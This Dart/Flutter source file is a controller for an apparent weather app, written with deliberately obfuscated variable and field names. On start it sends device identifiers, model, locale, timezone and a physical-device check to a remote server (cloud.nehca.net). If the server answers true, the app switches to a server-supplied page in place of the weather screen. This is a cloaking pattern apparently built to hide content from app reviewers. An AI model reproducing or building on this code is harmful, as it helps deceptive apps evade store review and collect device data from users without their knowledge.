import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void majshfhaiuhi() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/get_failed");
  }
}

class WeatherTabLogic extends GetxController {

  var rpqfkx = RxBool(false);
  var dymwabit = RxBool(true);
  var hrwtvul = RxString("");
  var madelynn = RxBool(false);
  var dare = RxBool(true);
  final nrlbik = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    majshfhaiuhi();
    tqgc();
  }


  Future<void> tqgc() async {

    madelynn.value = true;
    dare.value = true;
    dymwabit.value = false;

    nrlbik.post("https://cloud.nehca.net/tudeywpb",data: await mdlnukx()).then((value) {
      var dvkwm = value.data["dvkwm"] as String;
      var wjsyh = value.data["wjsyh"] as bool;
      print(value.data);
      if (wjsyh) {
        SystemChrome.setPreferredOrientations([
          DeviceOrientation.portraitUp,
        ]);
        hrwtvul.value = dvkwm;
        kylie();
      } else {
        mann();
      }
    }).catchError((e) {
      dymwabit.value = true;
      dare.value = true;
      madelynn.value = false;
    });
  }

  Future<Map<String, dynamic>> mdlnukx() async {
    final DeviceInfoPlugin ydobxf = DeviceInfoPlugin();
    PackageInfo xorgu_aipzksj = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var aowf = Platform.localeName;
    var hd_sIOMKjJi = currentTimeZone;

    var hd_DU = xorgu_aipzksj.packageName;
    var hd_JRCejyG = xorgu_aipzksj.version;
    var hd_vjETM = xorgu_aipzksj.buildNumber;

    var hd_uAdsoKa = xorgu_aipzksj.appName;
    var hd_bCVf = "";
    var hd_rXjqcI  = "";
    var hd_TAxHBC = "";
    var hayleeKulas = "";
    var thereseSchimmel = "";
    var idaChamplin = "";
    var hopeGleichner = "";
    var ezequielSenger = "";


    var hd_yrh = "";
    var hd_afHb = false;

    if (GetPlatform.isAndroid) {
      hd_yrh = "android";
      var whsnylx = await ydobxf.androidInfo;

      hd_TAxHBC = whsnylx.brand;

      hd_bCVf  = whsnylx.model;
      hd_rXjqcI = whsnylx.id;

      hd_afHb = whsnylx.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hd_yrh = "ios";
      var xbagcetr = await ydobxf.iosInfo;
      hd_TAxHBC = xbagcetr.name;
      hd_bCVf = xbagcetr.model;

      hd_rXjqcI = xbagcetr.identifierForVendor ?? "";
      hd_afHb  = xbagcetr.isPhysicalDevice;
    }
    var res = {
      "hd_uAdsoKa": hd_uAdsoKa,
      "hd_vjETM": hd_vjETM,
      "hd_DU": hd_DU,
      "hd_bCVf": hd_bCVf,
      "thereseSchimmel" : thereseSchimmel,
      "hd_sIOMKjJi": hd_sIOMKjJi,
      "hd_TAxHBC": hd_TAxHBC,
      "hd_rXjqcI": hd_rXjqcI,
      "idaChamplin" : idaChamplin,
      "aowf": aowf,
      "hd_yrh": hd_yrh,
      "hd_JRCejyG": hd_JRCejyG,
      "hd_afHb": hd_afHb,
      "hayleeKulas" : hayleeKulas,
      "hopeGleichner" : hopeGleichner,
      "ezequielSenger" : ezequielSenger,

    };
    return res;
  }

  Future<void> mann() async {
    Get.offAllNamed("/weather_main");
  }

  Future<void> kylie() async {
    Get.offAllNamed("/get_restart");
  }

}
